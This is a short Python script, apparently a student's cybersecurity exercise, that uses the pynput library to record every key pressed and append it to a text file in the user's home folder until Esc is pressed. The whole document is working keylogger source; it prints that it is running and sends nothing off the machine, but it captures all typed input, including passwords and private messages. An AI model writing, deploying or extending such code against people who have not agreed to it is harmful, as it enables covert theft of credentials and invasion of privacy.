from pynput import keyboard
import os

log_file_path = os.path.join(os.path.expanduser('~'), 'OneDrive', 'Desktop', 'vs code', 'dsa', 'cyber_security', 'key.txt')

def log_keystroke(key):
    with open(log_file_path, 'a') as log_file:
        try:
            log_file.write(key.char)
        except AttributeError:
            log_file.write(f'[{key}]')

def on_release(key):
    if key == keyboard.Key.esc:
        return False

print("Keylogger started. Press 'Esc' to stop.")

with keyboard.Listener(on_press=log_keystroke, on_release=on_release) as listener:
    listener.join()

print("Keylogger stopped.")